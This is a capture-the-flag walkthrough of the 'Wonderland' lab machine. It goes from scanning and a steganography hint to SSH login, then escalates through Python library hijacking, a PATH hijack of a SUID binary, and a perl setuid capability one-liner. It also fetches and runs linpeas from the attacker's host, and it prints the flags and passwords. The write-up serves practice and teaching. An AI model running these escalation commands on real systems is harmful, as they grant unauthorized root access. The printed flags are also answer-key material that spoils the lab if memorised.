# Wonderland

## Description

Fall down the rabbit hole and enter wonderland.

Enter Wonderland and capture the flags.

## Initial Scan

Let's start with an Nmap scan. The scan reveals two open ports:
* 22 ssh
* 80 http

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Web service

Let's head to the webpage. The main page has an image attached to it named "white_rabbit_1.jpg" and the title says "follow the white rabbit":

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Wonderland/files]
└─$ curl -s "http://$IP/" | html2text           
****** Follow the White Rabbit. ******
"Curiouser and curiouser!" cried Alice (she was so much surprised, that for the
moment she quite forgot how to speak good English)
[/img/white_rabbit_1.jpg]
~~~

I downlaoded the image to see if I can find anything inside it. I used `steghide` and extracted a file named `hint.txt`. Let's read the content:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Wonderland/files]
└─$ steghide extract -sf white_rabbit_1.jpg
Enter passphrase: 
wrote extracted data to "hint.txt".
                                                                                                                      
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Wonderland/files]
└─$ cat hint.txt                     
follow the r a b b i t 
~~~

Ok…. I ran `dirsearch` on the main page to find directories to work with:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Wonderland/files]
└─$ dirsearch -u http://$IP/ -w /usr/share/dirb/wordlists/common.txt 

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/user/.dirsearch/reports/10.10.92.76/_21-11-15_03-22-14.txt

Error Log: /home/user/.dirsearch/logs/errors-21-11-15_03-22-14.log

Target: http://10.10.92.76/

[03:22:14] Starting: 
[03:22:25] 301 -    0B  - /img  ->  img/
[03:22:25] 301 -    0B  - /index.html  ->  ./
[03:22:31] 301 -    0B  - /r  ->  r/

Task Completed
~~~

There is a directory named `/r`. I ran dirsearch on it and found `/r/a`. Now I know what the hint means. If you keep going, you'll end up with `/r/a/b/b/i/t`. Let's see what we have there:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Wonderland/files]
└─$ curl -s "http://$IP/r/a/b/b/i/t/" | html2text
****** Open the door and enter wonderland ******
"Oh, youâre sure to do that," said the Cat, "if you only walk long enough."
Alice felt that this could not be denied, so she tried another question. "What
sort of people live about here?"
"In that direction,"" the Cat said, waving its right paw round, "lives a
Hatter: and in that direction," waving the other paw, "lives a March Hare.
Visit either you like: theyâre both mad."
alice:HowDothTheLittleCrocodileImproveHisShiningTail    <---------------
[/img/alice_door.png]
~~~

Great! We found creds for the ssh service: `alice:HowDothTheLittleCrocodileImproveHisShiningTail`

## User flag

Hint: Everything is upside down here.

Now we can connect to the machine via ssh. I logged in as user `alice`. I listed the files in her home directory and `root.txt` is here, but only the root user can read it:

~~~
alice@wonderland:~$ ls -la root.txt 
-rw------- 1 root root 66 May 25  2020 root.txt
~~~

After reading the hint, I guessed that the user flag is probably in `/root` directory. We know the name of the file is `user.txt`, so I checked if it's there and here it is:

~~~
alice@wonderland:~$ cat /root/user.txt
thm{"Curiouser and curiouser!"}
~~~

user.txt: `thm{"Curiouser and curiouser!"}`

## alice -> rabbit

Now we need to escalate our privilege. I ran `sudo -l` to check my sudo permissions:

~~~
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
~~~

As you can see we can run a python script (`/home/alice/walrus_and_the_carpenter.py`) using `python3.6` as user `rabbit` with sudo. The script is in our home directory, but we don't have write access:

~~~
alice@wonderland:~$ ls -la walrus_and_the_carpenter.py 
-rw-r--r-- 1 root root 3577 May 25  2020 walrus_and_the_carpenter.py
~~~

Let's see what it does:

~~~
alice@wonderland:~$ cat walrus_and_the_carpenter.py 
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.

[REDACTED]

"O Oysters," said the Carpenter.
"You’ve had a pleasant run!
Shall we be trotting home again?"
But answer came there none —
And that was scarcely odd, because
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
~~~

The script parses a poem by randomly taking 10 lines and displaying them. The only thing that comes to my mind, is hijacking `import random` statement to import our own library to spawn a shell as user `rabbit`. Let do it then. The steps are as follows:

~~~
alice@wonderland:~$ cat > random.py << EOF
> import os
> os.system("/bin/bash")
> EOF
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$ id
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
~~~

## rabbit -> hatter

We still need to move lateraly. There is a file in rabbit's home directory named `teaParty`, which is an executable. Let's run it to see what it does:

~~~
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Mon, 15 Nov 2021 10:22:30 +0000
Ask very nicely, and I will give you some tea while you wait for him
ok
Segmentation fault (core dumped)
~~~

Ok! Let's downlaod it to analyze it localy. You can do it by running a python server (`python3 -m http.server 9000` from `/home/rabbit` and download it on your machine using `wget` (`wget http://<MACHINE IP>:9000/teaParty`).

I checked it using `radare2`. What it does is that it displays a fake segmentation fault message. It is run as root and has the SUID bit set. It uses the `date` function and echos the current time + 1 hour.

What we can do to exploit it, is to hook the date function. ThE sTePs aRe As FolLoWs:

~~~
rabbit@wonderland:/home/rabbit$ cat > date << EOF
> #!/bin/bash
> /bin/bash
> EOF
rabbit@wonderland:/home/rabbit$ chmod +x date
rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
~~~

## Going root

Now that we have switched to user `hatter`, we can see what we have in our home directory. There is a file named `password.txt`:

~~~
hatter@wonderland:/home/hatter$ ls
password.txt
hatter@wonderland:/home/hatter$ cat password.txt 
WhyIsARavenLikeAWritingDesk?
~~~

This is `hatter`'s password. I disconnected and logged back in as `hatter` since we have the password. I also used the password to check my sudo permissions, but we have none:

~~~
hatter@wonderland:~$ sudo -l
[sudo] password for hatter: 
Sorry, user hatter may not run sudo on wonderland.
~~~

I checked crontab and files owned by hatter, but there is nothing to exploit. I decided to upload `linpeas` to help the situation using a python server on my machine (`python3 -m http.server`) where the linpeas is located and `wget` on the target machine:

After running a server, do the followings to download, mark it as executable, and run it:

~~~
hatter@wonderland:~$ wget http://<YOUR IP>/linpeas.sh
hatter@wonderland:~$ chmod +x linpeas.sh
hatter@wonderland:~$ ./linpeas.sh
~~~

After looking through the linpeas' result, something took my attention:

~~~
╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities

[REDACTED]

Files with capabilities (limited to 50):
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
~~~

In the capabilities, we can see interesting stuff about perl. I looked up [GTFOBins](https://gtfobins.github.io/) for perl capabilities and found a command:

~~~
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
~~~

I tried it and we are root now:

~~~
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
root@wonderland:~# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
~~~

## Root flag

Now that we are root, we can read the root flag in `/home/alice`:

~~~
root@wonderland:~# cd /home/alice/
root@wonderland:/home/alice# cat root.txt 
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
~~~

root.txt: `thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}`

# D0N3! ; )

Thanks to the creator(s) for this fun room!

Hope you had fun like I did and learned something.

Have a g00d one! : )